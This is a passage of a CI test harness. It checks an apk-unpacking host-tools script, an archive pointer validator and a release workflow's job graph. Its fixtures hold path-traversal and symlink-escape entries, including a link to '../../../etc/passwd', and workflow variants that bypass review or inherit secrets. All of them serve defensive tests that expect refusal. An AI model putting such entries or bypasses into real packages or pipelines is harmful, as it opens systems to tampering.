LOCK = "bubblewrap=0.13.0-r0\nglibc=2.43-r13\nld-linux=2.43-r13\nlibcap=2.78-r4\n"
n = [0]


def case(label, setup=None, lock=LOCK, want=0, extra_args=(), arch=ARCH, after=None, nothing_written=None):
    n[0] += 1
    d = "%s/c%d" % (base, n[0]); os.makedirs(d + "/archive/" + ARCH); os.makedirs(d + "/bin")
    good_set(d + "/archive/" + ARCH)
    if setup: setup(d)
    lp = d + "/host-tools.lock"
    open(lp, "wb").write(lock.encode() if isinstance(lock, str) else lock)
    args = ["python3", "-I", script, "--archive", d + "/archive", "--lock", lp, "--root", d + "/host-tools", "--bin", d + "/bin", "--arch", arch] + list(extra_args)
    r = subprocess.run(args, capture_output=True, text=True)
    good = r.returncode == want
    if want != 0 and nothing_written is not False:
        good = good and not os.path.exists(d + "/host-tools") and not os.path.exists(d + "/bin/bwrap") and not os.path.exists(d + "/host-tools.staging") and not os.path.exists(d + "/probe")
    if good and after:
        try: after(d, r)
        except AssertionError as e: good = False; r.stderr += " AFTER: %s" % e
    print(("ok   " if good else "FAIL ") + label + ("" if good else " -> rc=%d %s" % (r.returncode, (r.stderr or r.stdout)[-200:].replace("\n", " "))))


def a_good(d, r):
    b = open(d + "/bin/bwrap").read()
    ld = os.path.abspath(d + "/host-tools") + "/usr/lib/ld-linux-x86-64.so.2"
    assert os.access(d + "/bin/bwrap", os.X_OK), "wrapper is not executable"
    assert b.startswith("#!/bin/sh\n") and ("exec %s --library-path %s/usr/lib:%s/lib %s/usr/bin/bwrap \"$@\"\n" % (ld, os.path.abspath(d + "/host-tools"), os.path.abspath(d + "/host-tools"), os.path.abspath(d + "/host-tools"))) in b, b
    out = subprocess.run([d + "/bin/bwrap", "--unshare-user", "true"], capture_output=True, text=True).stdout
    assert out.startswith("LOADER --library-path ") and out.rstrip().endswith("/usr/bin/bwrap --unshare-user true"), out
    assert os.path.islink(d + "/host-tools/usr/lib/libcap.so.2") and os.readlink(d + "/host-tools/usr/lib/libcap.so.2") == "libcap.so.2.78"
    assert not os.path.exists(d + "/host-tools/.PKGINFO"), "control files are not unpacked"


def a_basic(d, r):
    assert os.access(d + "/bin/bwrap", os.X_OK) and os.path.isfile(d + "/host-tools/usr/bin/bwrap") and os.path.isfile(d + "/host-tools/usr/lib/libcap.so.2.78")


def a_only_lock(d, r):
    assert not os.path.exists(d + "/host-tools/usr/bin/evil"), "a package the lock does not name was unpacked"


def s_extra_pkg(d):
    apk(d + "/archive/" + ARCH + "/evil-1.0-r0.apk", "evil", "1.0-r0", [("usr/bin/evil", "file", b"E", 0o755)])


def s_other_arch(d):
    os.makedirs(d + "/archive/aarch64"); apk(d + "/archive/aarch64/bubblewrap-0.13.0-r0.apk", "bubblewrap", "0.13.0-r0", [("usr/bin/evil", "file", b"E", 0o755)], arch="aarch64")


def ro(f):
    def g(d):
        f(d)
    return g


case("AC17 the packages the lock names are unpacked into a new directory and a wrapper runs the extracted loader with --library-path over the extracted libraries (a signature segment first is read too)", after=a_good)
case("AC17 an apk with a signature segment before its control segment is read the same", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], sig=True), after=a_basic)
case("AC17 only the packages the lock names are unpacked (an apk in the archive that the lock does not name, and one of another architecture, are never opened)", setup=lambda d: (s_extra_pkg(d), s_other_arch(d)), after=a_only_lock)
case("AC17 a package file that the lock names but archive/<arch>/ does not hold is refused (exit 1), nothing written", setup=lambda d: os.remove(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk"), want=1)
case("AC17 a package whose data segment does not match the datahash of its control segment is refused (exit 1), nothing written", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], datahash="0" * 64), want=1)
case("AC17 a data segment changed after the pack (the control segment kept the old datahash) is refused", setup=lambda d: open(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "ab").write(gz(b"x")), want=1)
case("AC17 a control segment that names another package than the lock row is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], pkgname="libpsx"), want=1)
case("AC17 a control segment that names another version than the lock row is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], pkgver="2.78-r3"), want=1)
case("AC17 a package built for another architecture (control segment says aarch64) in the x86_64 directory is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], arch="aarch64"), want=1)
case("AC17 a noarch package is accepted", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], arch="noarch"), after=a_basic)
case("AC17 a file that is not an apk (not gzip) is refused", setup=lambda d: open(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "wb").write(b"not an apk"), want=1)
case("AC17 an apk that is a symlink instead of a file is refused", setup=lambda d: (os.remove(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk"), os.symlink(d + "/archive/" + ARCH + "/glibc-2.43-r13.apk", d + "/archive/" + ARCH + "/libcap-2.78-r4.apk")), want=1)
for label, ent in (("an absolute path", [("/etc/evil", "file", b"E", None)]), ("a .. part", [("usr/../../evil", "file", b"E", None)]),
                   ("a symlink with an empty target", [("usr/lib/x", "sym", "", None)]), ("a member placed through an absolute symlink (etc/mtab -> /proc/mounts ; etc/mtab/x)", [("etc/mtab", "sym", "/proc/mounts", None), ("etc/mtab/x", "file", b"E", None)]), ("a hard link", [("usr/lib/x", "hard", "usr/lib/libcap.so.2.78", None)]), ("a device", [("usr/lib/dev", "dev", None, None)]),
                   ("a path that another package also holds", [("usr/lib/libc.so.6", "file", b"OTHER", None)]),
                   ("a chain of symlinks that writes outside the staging directory (a -> . ; a/b -> .. ; a/b/probe)", [("a", "sym", ".", None), ("a/b", "sym", "..", None), ("a/b/probe", "file", b"P", None)]),
                   ("two symlinks that together leave the directory (a -> . ; b -> a/../probe)", [("a", "sym", ".", None), ("b", "sym", "a/../probe", None)]),
                   ("two symlinks that together leave the directory, the second named first (b -> a/../probe ; a -> .)", [("b", "sym", "a/../probe", None), ("a", "sym", ".", None)]),
                   ("a link that leaves the root and comes back through the staging name (a -> . ; b -> a/../host-tools.staging/probe)", [("a", "sym", ".", None), ("b", "sym", "a/../host-tools.staging/probe", None)]),
                   ("the same, the second named first (b -> a/../host-tools.staging/probe ; a -> .)", [("b", "sym", "a/../host-tools.staging/probe", None), ("a", "sym", ".", None)]),
                   ("a link into a sibling that has the root's own name (up -> .. ; up/host-tools/x as the target of w)", [("up", "sym", "usr/lib/../..", None), ("w", "sym", "up/../host-tools.staging/x", None)]),
                   ("a file written through a symlinked directory over another package's file (alias -> usr/lib ; alias/libc.so.6)", [("alias", "sym", "usr/lib", None), ("alias/libc.so.6", "file", b"OTHER", None)]),
                   ("a regular file that is later used as a directory (saved ; saved/child)", [("saved", "file", b"x", None), ("saved/child", "file", b"y", None)])):
    case("AC17 a data segment with %s is refused (exit 1), nothing written" % label,
         setup=(lambda e: lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)] + e))(ent), want=1)
def s_abs_link(d):
    os.makedirs(d + "/outside")
    apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None), ("etc/mtab", "sym", d + "/outside", None), ("var/spool/mail", "sym", "/var/mail", None)])


def a_abs_link(d, r):
    a_basic(d, r)
    for p in ("etc/mtab", "var/spool/mail"):
        assert not os.path.lexists(d + "/host-tools/" + p), "an absolute link is never created: " + p
    assert "skipped absolute link etc/mtab -> " + d + "/outside" in r.stdout, r.stdout
    assert "skipped absolute link var/spool/mail -> /var/mail" in r.stdout, r.stdout
    assert os.listdir(d + "/outside") == [], "something was written at the target of an absolute link"
    assert os.path.isfile(d + "/host-tools/usr/lib/libcap.so.2.78"), "the files stay"


def a_abs_loader_path(d, r):
    # an absolute link on a library path of the loader is skipped: the real files stay real and the host is never reached
    a_basic(d, r)
    h = d + "/host-tools"
    assert not os.path.lexists(h + "/usr/lib/libcap.so.2.x") and not os.path.lexists(h + "/lib"), "an absolute link was created"
    assert "skipped absolute link usr/lib/libcap.so.2.x -> /tmp/x" in r.stdout and "skipped absolute link lib -> /usr/lib" in r.stdout, r.stdout


case("AC17 an ABSOLUTE symlink (wolfi-baselayout's etc/mtab -> /proc/mounts, var/spool/mail -> /var/mail) is never created: it is skipped and logged, nothing is written at its target, the relative links stay", setup=s_abs_link, after=a_abs_link)
case("AC17 an absolute link on the loader's library path (usr/lib/libcap.so.2.x -> /tmp/x, lib -> /usr/lib) is skipped: nothing is created there, so the loader never meets a host path", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None), ("usr/lib/libcap.so.2.x", "sym", "/tmp/x", None), ("lib", "sym", "/usr/lib", None)]), after=a_abs_loader_path)
for label, ent in (("an absolute link at the place of a real directory (usr -> /external): the place is already taken, the link is not skipped over it", [("usr", "sym", "/external", None)]),
                   ("an absolute link at the place of the real directory holding bwrap (usr/bin -> /outside/bin): the place is already taken", [("usr/bin", "sym", "/outside/bin", None)])):
    case("AC17 a data segment with %s is refused (exit 1), nothing written" % label,
         setup=(lambda e: lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)] + e))(ent), want=1)
for label, ent in (("a member placed below an absolute link that was skipped (usr/lib/y -> /tmp ; usr/lib/y/z)", [("usr/lib/y", "sym", "/tmp", None), ("usr/lib/y/z", "file", b"E", None)]),
                   ("a file at the place of a skipped absolute link in another entry of the same package (etc/mtab -> /proc/mounts ; etc/mtab as a file)", [("etc/mtab", "sym", "/proc/mounts", None), ("etc/mtab", "file", b"E", None)]),
                   ("a relative link that leaves the root next to an absolute link (etc/mtab -> /proc/mounts ; usr/lib/x -> ../../../etc/passwd)", [("etc/mtab", "sym", "/proc/mounts", None), ("usr/lib/x", "sym", "../../../etc/passwd", None)])):
    case("AC17 a data segment with %s is refused (exit 1), nothing written" % label,
         setup=(lambda e: lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)] + e))(ent), want=1)
case("AC17 a member of a LATER package placed below the path of a skipped absolute link is refused (the path is held by the package that named it)", setup=lambda d: (apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None), ("etc/mtab", "sym", "/proc/mounts", None)]), apk(d + "/archive/" + ARCH + "/libpsx-2.78-r4.apk", "libpsx", "2.78-r4", [("etc/mtab/x", "file", b"E", None)])), lock=LOCK + "libpsx=2.78-r4\n", want=1)

def two_pk(first, second, second_first=False):
    def setup(d):
        apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)] + first)
        apk(d + "/archive/" + ARCH + "/libpsx-2.78-r4.apk", "libpsx", "2.78-r4", second)
    return setup


SKIP = [("etc/mtab", "sym", "/proc/mounts", None)]
for label, first, second, rev in (
        ("a directory entry at the path of a skipped absolute link in a LATER package", SKIP, [("etc/mtab", "dir", None, None)], False),
        ("a directory entry at the path of a skipped absolute link in the same package", SKIP + [("etc/mtab", "dir", None, None)], [("usr/lib/other", "file", b"x", None)], False),
        ("a file at the path of a skipped absolute link in a LATER package", SKIP, [("etc/mtab", "file", b"E", None)], False),
        ("a relative link at the path of a skipped absolute link in a LATER package", SKIP, [("etc/mtab", "sym", "../x", None)], False),
        ("a second absolute link at the path of a skipped absolute link in a LATER package", SKIP, [("etc/mtab", "sym", "/proc/self/mounts", None)], False),
        ("a symlink at an ANCESTOR of a skipped absolute link in a LATER package (opt/bin -> /external ; opt -> payload)", [("opt/bin", "sym", "/external", None)], [("opt", "sym", "payload", None), ("payload/bin/bwrap", "file", b"E", None)], False),
        ("a symlink at an ancestor of a skipped absolute link in the same package, after it", [("opt/bin", "sym", "/external", None), ("opt", "sym", "payload", None)], [("usr/lib/other", "file", b"x", None)], False),
        ("a symlink at an ancestor named by an EARLIER package, the skipped link below it (opt -> payload ; opt/bin -> /external)", [("opt/bin", "sym", "/external", None)], [("opt", "sym", "payload", None)], True)):
    case("AC17 %s is refused (exit 1), nothing written" % label, setup=two_pk(first, second), lock=(("libpsx=2.78-r4\n" + LOCK) if rev else (LOCK + "libpsx=2.78-r4\n")), want=1)
case("AC17 no loader in the unpacked tree is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/ld-linux-2.43-r13.apk", "ld-linux", "2.43-r13", [("usr/lib/other", "file", b"x", None)]), want=1)
case("AC17 two loaders in the unpacked tree are refused (the wrapper must name exactly one)", setup=lambda d: apk(d + "/archive/" + ARCH + "/ld-linux-2.43-r13.apk", "ld-linux", "2.43-r13", [("usr/lib/ld-linux-x86-64.so.2", "file", LOADER, 0o755), ("lib/ld-linux-x86-64.so.2", "file", LOADER, 0o755)]), want=1)
case("AC17 no usr/bin/bwrap in the unpacked tree is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/bubblewrap-0.13.0-r0.apk", "bubblewrap", "0.13.0-r0", [("usr/bin/other", "file", b"x", 0o755)]), want=1)
case("AC17 a host-tools directory that already exists is refused (exit 2), nothing in it touched", setup=lambda d: (os.makedirs(d + "/host-tools"), open(d + "/host-tools/keep", "w").write("k")), want=2, nothing_written=False,
     after=lambda d, r: (open(d + "/host-tools/keep").read() == "k" and not os.path.exists(d + "/bin/bwrap")) or (_ for _ in ()).throw(AssertionError("touched")))
for label, lk in (("an empty lock", ""), ("a lock row with no version", "bubblewrap\n"), ("a lock with a blank row", LOCK + "\n"), ("a lock with a carriage return", LOCK.replace("\n", "\r\n")),
                  ("a lock without its final line end", LOCK.rstrip("\n")), ("a lock that names a package twice", LOCK + "libcap=2.78-r4\n"), ("a lock row with a path part", "../x=1.0-r0\n" + LOCK),
                  ("a lock row with a space", "bubblewrap = 0.13.0-r0\n"), ("a lock row that is a comment", "# bubblewrap\n" + LOCK)):
    case("AC17 %s is refused (exit 2), nothing written" % label, lock=lk, want=2)
case("AC17 an architecture other than x86_64 and aarch64 is refused (exit 2)", arch="riscv64", want=2)
case("AC17 aarch64 is accepted and reads archive/aarch64/", arch="aarch64", setup=lambda d: (shutil.copytree(d + "/archive/" + ARCH, d + "/archive/aarch64"), [apk(d + "/archive/aarch64/" + f, f.rsplit("-", 2)[0], "-".join(f[:-4].rsplit("-", 2)[1:]), [("usr/bin/bwrap", "file", b"B", 0o755)] if f.startswith("bubblewrap") else [("usr/lib/ld-linux-aarch64.so.1", "file", LOADER, 0o755)] if f.startswith("ld-linux") else [("usr/lib/x%s" % f, "file", b"x", None)], arch="aarch64") for f in os.listdir(d + "/archive/aarch64")]), after=lambda d, r: os.path.exists(d + "/host-tools/usr/lib/ld-linux-aarch64.so.1") or (_ for _ in ()).throw(AssertionError("aarch64 loader")))
case("AC17 a wrapper that cannot be published (bin/bwrap is a directory) is refused (exit 1) and leaves neither the host-tools directory, a staging directory nor a temporary wrapper", setup=lambda d: os.makedirs(d + "/bin/bwrap"), want=1, nothing_written=False,
     after=lambda d, r: (not os.path.exists(d + "/host-tools") and not os.path.exists(d + "/host-tools.staging") and not [f for f in os.listdir(d + "/bin") if f.startswith(".bwrap.")]) or (_ for _ in ()).throw(AssertionError("residue")))
case("AC17 an unknown option is refused (exit 2)", extra_args=("--sudo",), want=2)
text = open(script).read()
for word in sys.argv[3].split("|"):
    print(("ok   " if word not in text else "FAIL ") + "AC17 the host-tools script never names %r (no network, no package manager, no sudo, no other program)" % word)
PY
while IFS= read -r line; do case $line in "ok   "*) ok "${line#ok   }";; *) bad "${line#FAIL }";; esac; done < "$work/ac17.out"
# REQ-CHAIN-004-AC16: the two files the stage's pull step runs are rows of the committed list with their committed sha256
python3 - "$root/.github/policy/chain-scripts.json" "$work/ar-nosha.json" "$work/ar-norow.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
e = json.loads(json.dumps(d)); [r.update(sha256="0" * 64) for r in e["scripts"] if r["path"] == "bin/archive-pull.sh"]; json.dump(e, open(sys.argv[2], "w"))
f = json.loads(json.dumps(d)); f["scripts"] = [r for r in f["scripts"] if r["path"] != "bin/archive-verify.py"]; json.dump(f, open(sys.argv[3], "w"))
PY
expect ok     "AC16 the real chain-scripts.json lists bin/archive-pull.sh and bin/archive-verify.py with their committed sha256" "" archive-listed "$root/.github/policy/chain-scripts.json" "$root"
expect caught "AC16 archive-pull.sh listed with a sha256 that is not the committed file's" "sha256" archive-listed "$work/ar-nosha.json" "$root"
expect caught "AC16 archive-verify.py (run by the pull) is not a row of chain-scripts.json" "not a row" archive-listed "$work/ar-norow.json" "$root"
# REQ-CHAIN-004-AC16: the pointer the stage's pull step reads, in the format cache#345 defines (bin/archive-verify.py): a fixture pointer is accepted, malformed ones are
# refused, and the committed build/archive.json, the real input of every pull, is held to the same check. It does not exist until the first refresh run's pull request
# merges: that one case is the only red of this block (known-red KR-ARCHIVE-1, green by the pointer pull request).
AV="$root/bin/archive-verify.py"
python3 - "$work" <<'PY'
import json, os, sys
w = sys.argv[1]; os.makedirs(w + "/ptr", exist_ok=True)
D = "ghcr.io/fosterstack/cache-archive@sha256:" + "a" * 64
good = {"schema": 1, "artifact": D, "files": [{"name": "keys/wolfi-signing.rsa.pub", "sha256": "b" * 64}, {"name": "x86_64/busybox-1.37.0-r5.apk", "sha256": "c" * 64}]}
def w_(n, d): json.dump(d, open("%s/ptr/%s.json" % (w, n), "w"))
w_("good", good)
w_("tag", dict(good, artifact="ghcr.io/fosterstack/cache-archive:latest"))
w_("noschema", {k: v for k, v in good.items() if k != "schema"})
w_("extra", dict(good, note="x"))
w_("empty", dict(good, files=[]))
w_("traversal", dict(good, files=[{"name": "../x", "sha256": "b" * 64}]))
w_("unsorted", dict(good, files=list(reversed(good["files"]))))
w_("shortsha", dict(good, files=[{"name": "a", "sha256": "b" * 63}]))
PY
ptr_ok()  { if python3 -I "$AV" pointer-check --pointer "$2" >"$work/ptr.out" 2>&1; then ok "$1"; else bad "$1 -> $(head -c 160 "$work/ptr.out")"; fi; }
ptr_bad() { if python3 -I "$AV" pointer-check --pointer "$2" >"$work/ptr.out" 2>&1; then bad "$1 -> accepted"; elif grep -Fq -- "$3" "$work/ptr.out"; then ok "$1 (refused: $(head -c 80 "$work/ptr.out"))"; else bad "$1 -> refused for another reason: $(head -c 160 "$work/ptr.out")"; fi; }
ptr_ok  "AC16 fixture: a pointer in cache#345's format (schema 1, the archive by digest, sorted unique files) is accepted by the check the pull runs" "$work/ptr/good.json"
ptr_bad "AC16 fixture: an archive named by a tag, not a digest, is refused" "$work/ptr/tag.json" "by digest only"
ptr_bad "AC16 fixture: a pointer without schema is refused" "$work/ptr/noschema.json" "exactly schema"
ptr_bad "AC16 fixture: a pointer with an extra field is refused" "$work/ptr/extra.json" "exactly schema"
ptr_bad "AC16 fixture: an empty file list is refused" "$work/ptr/empty.json" "non-empty"
ptr_bad "AC16 fixture: a file name that leaves the directory is refused" "$work/ptr/traversal.json" "unsafe file name"
ptr_bad "AC16 fixture: files out of order are refused" "$work/ptr/unsorted.json" "sorted and unique"
ptr_bad "AC16 fixture: a short sha256 is refused" "$work/ptr/shortsha.json" "64 lower-case hex"
av_out=$(python3 -I "$AV" artifact --pointer "$work/ptr/good.json" 2>/dev/null)
if grep -Fq "sha256:$(printf 'a%.0s' $(seq 64))" <<< "$av_out"; then ok "AC16 fixture: the digest the pull passes to crane is the pointer's"; else bad "AC16 fixture: the digest the pull passes to crane is not the pointer's"; fi
ptr_ok  "AC16 the committed build/archive.json, the input of every stage pull, is a valid pointer" "$root/build/archive.json"
# REQ-CHAIN-004-AC16 (release review R1): every part of archive/ that a stage script reads is something the archive holds. The archive the refresh job stores
# (cache#345, REQ-ARCHIVE-001) holds keys/ and one directory per architecture (apk files, signed indexes); the stage scripts name archive/keys/..., the repository
# directory archive itself, and archive/go (the Go toolchain tarball that build-apk.sh requires, rule 12: "kept in the archive"). What the stored archive holds is read from the
# committed pointer (build/archive.json), so this case is green exactly when the pointer lists go/.
if python3 - "$root" <<'PY'
import glob, re, sys
root = sys.argv[1]
import json
HELD = {f["name"].split("/")[0] for f in json.load(open(root + "/build/archive.json"))["files"]}     # what the committed pointer says the stored archive holds at its top level (a bare "archive" names the repository directory itself)
seen = {}
for f in sorted(glob.glob(root + "/bin/build-stage-*.sh")):
    for m in re.finditer(r"(?<![A-Za-z0-9_./-])archive/([A-Za-z0-9_.-]+)", open(f).read()):
        seen.setdefault(m.group(1), set()).add(f.rsplit("/", 1)[1])
miss = {k: sorted(v) for k, v in seen.items() if k not in HELD}
if miss:
    print("stage scripts read archive/ parts that the archive does not hold: %s" % miss); sys.exit(1)
PY
then ok "AC16 every archive/ path the stage scripts read is held by the stored archive"; else bad "AC16 every archive/ path the stage scripts read is held by the stored archive"; fi
# ---- the job graph of release.yml (REQ-CHAIN-005-AC5) -----------------------------------------------------------------------------------------
expect ok "005-AC5 fixture: build -> sign -> check, rebuild beside them, (rebuild, check, sign) -> release; other jobs ignored" "" graph "$work/release.yml"
gr() { replace "$work/release.yml" "$work/$1.yml" "$3" "$4" && expect caught "$2" "$5" graph "$work/$1.yml"; return 0; }
GATE_BODY="(github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true"
GATE="\${{ $GATE_BODY }}"
OLDDRY="\${{ !cancelled() && (needs.admission.result == 'success' || inputs.dry-run) }}"
TAGONLY="\${{ startsWith(github.ref, 'refs/tags/v') }}"
PNIF="\${{ needs.decide.outputs.tagged == 'true' && !inputs.dry-run }}"
RELIF="\${{ startsWith(github.ref, 'refs/tags/v') && !inputs.dry-run }}"
SIGN_HEAD="  sign:\n    if: $GATE\n    needs: build"
BUILD_USES="    uses: ./.github/workflows/stage-build.yml"
BUILD_HEAD="    if: $GATE\n$BUILD_USES"
REL_HEAD="  release:\n    if: $RELIF\n    needs: [check, sign, sign-rebuild, sign-check]"
gr g1  "005-AC5 rebuild waits for check" '  rebuild:\n    needs: [build, sign]' '  rebuild:\n    needs: [build, sign, check]' "rebuild must need exactly"
gr g2  "005-AC5 check waits for rebuild" '  check:\n    needs: [build, sign]' '  check:\n    needs: [build, sign, rebuild]' "check must need exactly"
# REQ-CHAIN-005-AC5 (Witness move): Rebuild and Check each need Build and Sign (they start from Build's record as Sign signed it) and run side by side.
gr g2b "005-AC5 check starts without Sign (it would read an unsigned local record)" '  check:\n    needs: [build, sign]' '  check:\n    needs: build' \
       "check must need exactly"
gr g2c "005-AC5 check needs sign but not build" '  check:\n    needs: [build, sign]' '  check:\n    needs: sign' "check must need exactly"
gr g3  "005-AC5 release does not need rebuild" 'needs: [check, sign, sign-rebuild, sign-check]' 'needs: [check, sign, sign-check]' "release must need exactly"
gr g3b "005-AC5 release does not need Sign's second call (Rebuild's records would be unsigned)" 'needs: [check, sign, sign-rebuild, sign-check]' 'needs: [check, sign, rebuild, sign-check]' "release must need exactly"
gr g3c "005-AC5 sign-rebuild does not wait for rebuild" '  sign-rebuild:\n    needs: [build, rebuild]' '  sign-rebuild:\n    needs: build' "sign-rebuild must need exactly"
gr g3x1 "R2 (round 6) sign-rebuild drops the records input (it would sign whatever arrives under the artifact names)" '      records: ${{ needs.rebuild.outputs.records }}\n' '' "sign-rebuild must pass exactly"
gr g3f "R2 (round 6) sign-rebuild takes its records from Build's output" 'records: ${{ needs.rebuild.outputs.records }}' 'records: ${{ needs.build.outputs.digests }}' "sign-rebuild must pass exactly"
gr g3d "005-AC5 sign-rebuild signs the build stage (the wrong records)" '      stage: rebuild' '      stage: build' "sign-rebuild must pass exactly"
gr g3e "005-AC5 sign without the stage input" '      stage: build\n  rebuild:' '  rebuild:' "sign must pass exactly"
gr g4 "005-AC5 sign does not need build" "$SIGN_HEAD" "  sign:\n    if: $GATE\n    needs: check" \
    "sign must need exactly"
gr g5  "005-AC5 rebuild with an if (it runs after build through needs; an if could skip it)" '  rebuild:\n    needs: [build, sign]' \
       '  rebuild:\n    needs: [build, sign]\n    if: always()' "rebuild may not carry an if"
gr g5b "005-AC5 check with an if (even the gate)" '  check:\n    needs: [build, sign]' "  check:\n    needs: [build, sign]\n    if: $GATE" "check may not carry an if"
gr g6  "005-AC5 release ungated while the gate G is used (a dry run would publish)" "$REL_HEAD" '  release:\n    needs: [check, sign, sign-rebuild, sign-check]' \
       "release must carry exactly the if"
gr g6b "005-AC5 release runs when a stage failed (if: always())" "$REL_HEAD" '  release:\n    if: always()\n    needs: [check, sign, sign-rebuild, sign-check]' \
       "release must carry exactly the if"
gr g7  "005-AC5 release runs when a stage failed (!cancelled())" "$REL_HEAD" "  release:\n    if: \${{ !cancelled() }}\n    needs: [check, sign, sign-rebuild, sign-check]" \
       "release must carry exactly the if"
gr g7b "005-AC5 release gated by G (a dry-run dispatch would call stage-promote)" "$REL_HEAD" "  release:\n    if: $GATE\n    needs: [check, sign, sign-rebuild, sign-check]" \
       "release must carry exactly the if"
gr g8  "005-AC5 a failed rebuild does not fail the run (continue-on-error)" '  rebuild:\n    needs: [build, sign]' \
       '  rebuild:\n    continue-on-error: true\n    needs: [build, sign]' "keys outside"
gr g13 "R3 release without its concurrency group (two publications could interleave and roll :X/:latest back)" '    concurrency:\n      group: release-publish\n      cancel-in-progress: false\n    uses: ./.github/workflows/stage-promote.yml' '    uses: ./.github/workflows/stage-promote.yml' "release must hold exactly the concurrency"
gr g14 "R3 the release concurrency group cancels in progress (a running publication would be killed half way)" 'cancel-in-progress: false\n    uses: ./.github/workflows/stage-promote.yml' 'cancel-in-progress: true\n    uses: ./.github/workflows/stage-promote.yml' "release must hold exactly the concurrency"
gr g15 "R3 the release concurrency group is shared with something else, or not constant" 'group: release-publish' 'group: ${{ github.ref }}' "release must hold exactly the concurrency"
gr g16 "R3 a concurrency key on any other chain job is outside the allowed keys" '  rebuild:\n    needs: [build, sign]' '  rebuild:\n    concurrency: x\n    needs: [build, sign]' "keys outside"
PF_IF="\${{ always() && (contains(needs.*.result, 'failure') || needs.release.result == 'cancelled') && startsWith(github.ref, 'refs/tags/v') && github.event_name != 'workflow_dispatch' && !inputs.dry-run }}"
PF_OLD="\${{ failure() && startsWith(github.ref, 'refs/tags/v') && github.event_name != 'workflow_dispatch' && !inputs.dry-run }}"
gr r3a "R3 audit: patch-failed with the old failure()-only if (a cancelled/replaced pending release would open no issue)" "if: $PF_IF" "if: $PF_OLD" "patch-failed must carry exactly the if"
gr r3b "R3 audit: patch-failed without any if" "    if: $PF_IF\n    runs-on: ubuntu-latest" "    runs-on: ubuntu-latest" "patch-failed must carry exactly the if"
gr r3c "R3 audit: cancel-in-progress written as the quoted string (actionlint rejects it; the loader cannot tell it from the boolean)" 'cancel-in-progress: false\n    uses: ./.github/workflows/stage-promote.yml' 'cancel-in-progress: "false"\n    uses: ./.github/workflows/stage-promote.yml' "unquoted line"
gr g9 "005-AC5 check calls another stage file" 'uses: ./.github/workflows/stage-verify.yml' 'uses: ./.github/workflows/stage-promote.yml' \
       "check must call exactly"
gr g10 "005-AC5 secrets: inherit on a stage call" 'uses: ./.github/workflows/stage-reproducibility.yml' \
       'uses: ./.github/workflows/stage-reproducibility.yml\n    secrets: inherit' "keys outside"
gr g11 "005-AC5 the Rebuild job is not named rebuild (a failure would not name the stage)" '  rebuild:' '  reproducibility:' "rebuild is missing"
gr g12 "005-AC5 release without sign" 'needs: [check, sign, sign-rebuild, sign-check]' 'needs: [check, sign-rebuild]' "release must need exactly"
FAST='  release-fast:\n    needs: [build, sign]\n    uses: ./.github/workflows/stage-promote.yml\n    secrets: inherit\n  decide:'
EARLY='  publish-early:\n    needs: [build, sign]\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n'
EARLY="$EARLY"'    steps:\n      - run: gh release create v1 dist/*\n  decide:'
REMOTE='  remote:\n    needs: [build, sign]\n    uses: fosterstack/cache/.github/workflows/promote-v2.yml@1111111111111111111111111111111111111111\n  decide:'
gr g13 "005-AC5 a copy of Release's call that skips Rebuild and Check (release-fast)" '  decide:' \
       "$FAST" "not one of the five chain jobs"
gr g14 "005-AC5 publish-early: a plain job after Sign that downloads dist and runs gh release create" '  decide:' \
       "$EARLY" "not one of the five chain jobs"
gr g15 "005-AC5 a job that calls a reusable workflow of another repository" '  decide:' \
       "$REMOTE" "job-level uses"
gr g16 "005-AC5 an allowed non-chain job (decide) given a job-level uses" '  decide:\n    if:' \
       '  decide:\n    uses: ./.github/workflows/ci.yml\n    if:' "job-level uses"
gr g17 "005-AC5 decide with a write it does not need (packages)" 'issues: write' 'issues: write\n      packages: write' "exactly the permissions"
gr g18 "005-AC5 decide with no permissions block of its own would inherit contents: read only (less than it needs: refused)" \
       '    permissions:\n      contents: read\n      checks: read\n      id-token: write\n      issues: write\n' '' "exactly the permissions"
gr g19 "005-AC5 a hostile-* job that can write" '  hostile-verify:\n    needs: sign\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read' \
